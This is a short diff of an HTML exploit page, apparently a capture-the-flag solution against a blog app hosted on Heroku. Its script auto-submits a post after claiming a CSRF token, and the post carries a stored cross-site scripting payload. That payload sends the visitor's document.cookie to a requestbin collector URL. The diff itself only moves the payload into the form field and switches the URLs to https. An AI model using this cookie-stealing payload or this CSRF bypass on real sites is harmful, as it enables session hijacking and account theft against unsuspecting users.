@@ -12,7 +12,7 @@
 </head>
 <body>
 
-<form class="container login-box" method="post" action="http://blog-force.herokuapp.com/post" id="form">
+<form class="container login-box" method="post" action="https://blog-force.herokuapp.com/post" id="form">
   <h1>Home</h1><hr>
   <h5>Add a Post</h5>
   <div class="form-group">
@@ -34,10 +34,10 @@
 
 <script>
     async function create_post(){
-        let hax = "<script>fetch('https://requestbin.net/r/8g9looxh?q='+document.cookie, { mode: 'no-cors' })</script>";
-        let content = encodeURIComponent(hax)
+        document.getElementById("content").value = "<script>fetch('https://requestbin.net/r/8g9looxh?q='+document.cookie, { mode: 'no-cors' })</script>";
+        let content = encodeURIComponent(document.getElementById("content").value);
         let content_hash = CryptoJS.MD5(content).toString();
-        await fetch(`http://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`);
+        await fetch(`https://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`);
         document.getElementById("csrf_token").value = content_hash;
         document.getElementById("send").click();
     }
